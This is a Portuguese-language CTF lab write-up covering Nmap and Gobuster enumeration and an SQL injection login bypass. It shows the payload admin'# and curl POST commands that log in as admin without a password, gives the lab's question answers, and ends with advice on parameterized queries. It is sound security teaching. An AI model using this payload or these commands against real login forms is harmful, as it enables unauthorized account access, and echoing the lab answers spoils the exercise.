# Write-up — Web Enumeration + SQL Injection Login Bypass

> Uso apenas em laboratórios, CTFs, máquinas próprias ou ambientes com autorização explícita.

## 1. Objetivo do lab

O objetivo foi enumerar um servidor web, entender serviços expostos, descobrir conceitos básicos de aplicação web e explorar uma falha de SQL Injection simples para acessar a conta `admin` sem saber a senha.

Durante o processo foram praticados:

- enumeração com Nmap;
- identificação de serviço HTTP;
- conceito de porta HTTPS;
- conceito de diretório em aplicação web;
- uso do Gobuster para brute force de diretórios;
- comentário em MySQL;
- bypass de login usando SQL Injection;
- execução do ataque pelo terminal com `curl`.

---

## 2. Enumeração inicial com Nmap

Primeiro foi feito um scan básico no alvo:

```bash
nmap 10.129.98.125
```

O Nmap mostrou a porta 80 aberta:

```text
80/tcp open  http
```

Isso indica que existe um serviço web rodando no alvo.

### Pergunta do lab

**What does Nmap report as the service and version that are running on port 80 of the target?**

No scan básico, apareceu apenas:

```text
http
```

Para descobrir a versão do serviço, o comando correto é:

```bash
nmap -sV -p 80 10.129.98.125
```

Ou, de forma mais completa:

```bash
nmap -sC -sV -p 80 10.129.98.125
```

Explicação:

- `-p 80`: escaneia apenas a porta 80;
- `-sV`: tenta identificar a versão do serviço;
- `-sC`: roda scripts padrão do Nmap.

## 3. Porta padrão do HTTPS

### Pergunta do lab

**What is the standard port used for the HTTPS protocol?**

Resposta:

```text
443
```

Resumo:

```text
HTTP  = 80/tcp
HTTPS = 443/tcp
```

HTTP é o protocolo web sem criptografia por padrão.

HTTPS é HTTP usando TLS/SSL, ou seja, comunicação criptografada.

## 5. Gobuster para descobrir diretórios

Gobuster é uma ferramenta usada para brute force de diretórios e arquivos em aplicações web.

### Pergunta do lab

**Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?**

Resposta:

```text
dir
```

Exemplo de uso:

```bash
gobuster dir -u http://10.129.98.125 -w /usr/share/wordlists/dirb/common.txt
```

Explicação:

- `gobuster`: ferramenta usada;
- `dir`: modo para procurar diretórios e arquivos;
- `-u`: URL alvo;
- `-w`: wordlist usada no brute force.

Comparação:

```text
gobuster dir  = procura diretórios/arquivos
gobuster dns  = procura subdomínios
```

## 6. Comentário em MySQL

### Pergunta do lab

**What single character can be used to comment out the rest of a line in MySQL?**

Resposta:

```text
#
```

No MySQL, o caractere `#` comenta o restante da linha.

Exemplo:

```sql
SELECT * FROM users WHERE username='admin' # resto ignorado
```

Tudo depois do `#` é ignorado pelo banco.

---

## 7. SQL Injection no login

A aplicação tinha um formulário de login vulnerável.

A ideia foi inserir um comentário SQL no campo de usuário para fazer o banco ignorar a verificação da senha.

Payload usado no campo `username`:

```text
admin'#
```

No campo `password`, poderia ser qualquer valor:

```text
123
```

### Por que funciona?

Uma query vulnerável poderia ser algo parecido com:

```sql
SELECT * FROM users WHERE username='admin'#' AND password='123';
```

O `#` comenta o resto da linha. Então a parte da senha é ignorada.

Na prática, a query fica equivalente a:

```sql
SELECT * FROM users WHERE username='admin'
```

Assim, a aplicação autentica como `admin` sem validar a senha.

### Pergunta do lab

**If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?**

Resposta encontrada:

```text
Congratulations
```

## 8. Fazendo pelo terminal com curl

Também foi possível fazer o login pelo terminal usando `curl`.

Primeiro, verificar o formulário da página:

```bash
curl -s http://10.129.98.125/ | grep -Ei "form|input"
```

Isso ajuda a encontrar os nomes dos campos, por exemplo:

```html
name="username"
name="password"
```

Depois, enviar o POST com o payload:

```bash
curl -i -s -L -X POST http://10.129.98.125/ \
  --data-urlencode "username=admin'#" \
  --data-urlencode "password=123"
```

Explicação:

- `-i`: mostra headers da resposta;
- `-s`: modo silencioso;
- `-L`: segue redirecionamentos;
- `-X POST`: força requisição POST;
- `--data-urlencode`: envia os dados do formulário com encoding correto.

Se o formulário estiver em outro caminho, por exemplo `/login.php`, usar:

```bash
curl -i -s -L -X POST http://10.129.98.125/login.php \
  --data-urlencode "username=admin'#" \
  --data-urlencode "password=123"
```

Para limpar HTML e ver só o texto da resposta:

```bash
curl -s -L -X POST http://10.129.98.125/ \
  --data-urlencode "username=admin'#" \
  --data-urlencode "password=123" \
| sed 's/<[^>]*>//g' | head
```

Se aparecer `Congratulations`, o bypass funcionou.

## 10. O que foi aprendido

Neste lab, o ponto principal foi entender que entrada de usuário nunca deve ser confiada diretamente.

Se a aplicação monta uma query SQL usando o que o usuário digitou sem validação, o atacante pode alterar a lógica da consulta.

Nesse caso, o comentário `#` permitiu ignorar a parte da senha.

O fluxo geral foi:

```text
1. Encontrar serviço web com Nmap
2. Entender que porta 80 = HTTP
3. Identificar conceitos básicos: directory, HTTPS 443
4. Usar Gobuster no modo dir para enumeração web
5. Entender comentário em MySQL com #
6. Inserir admin'# no login
7. Ignorar a senha
8. Acessar como admin
9. Confirmar resposta: Congratulations
```

---

## 11. Correção segura da vulnerabilidade

Para evitar esse tipo de falha, a aplicação deveria usar queries parametrizadas/prepared statements.

Exemplo conceitual seguro:

```text
NÃO montar SQL concatenando texto do usuário.
Usar parâmetros separados para username e password.
```

Também é importante:

- validar entradas;
- não revelar erros SQL ao usuário;
- usar hash seguro para senhas;
- registrar tentativas suspeitas de login;
- aplicar princípio do menor privilégio no banco.

---

## 12. Conclusão prática

Esse lab simulou uma falha real muito comum: SQL Injection em tela de login.

A parte mais importante não foi decorar o payload, mas entender a lógica:

```text
O comentário # cortou a query antes da verificação da senha.
```

Por isso o login como `admin` funcionou sem conhecer a senha.
